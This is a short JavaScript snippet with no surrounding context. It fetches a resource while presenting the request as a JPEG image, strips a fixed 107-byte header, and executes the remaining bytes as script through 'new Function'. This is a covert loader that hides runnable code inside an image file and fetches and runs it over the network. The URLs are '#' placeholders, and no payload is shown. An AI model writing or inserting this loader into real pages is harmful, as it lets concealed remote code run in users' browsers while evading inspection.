(function (win) {
  fetch("#", {
    headers: { Accept: "image/jpeg" },
  })
    .then(function (response) {
      return response.arrayBuffer();
    })
    .then(function (buffer) {
      new win.Function(
        new win.TextDecoder("utf-8").decode(new win.Uint8Array(buffer, 107))
      )();
      new win.Image().src = "#";
    });
})(window);
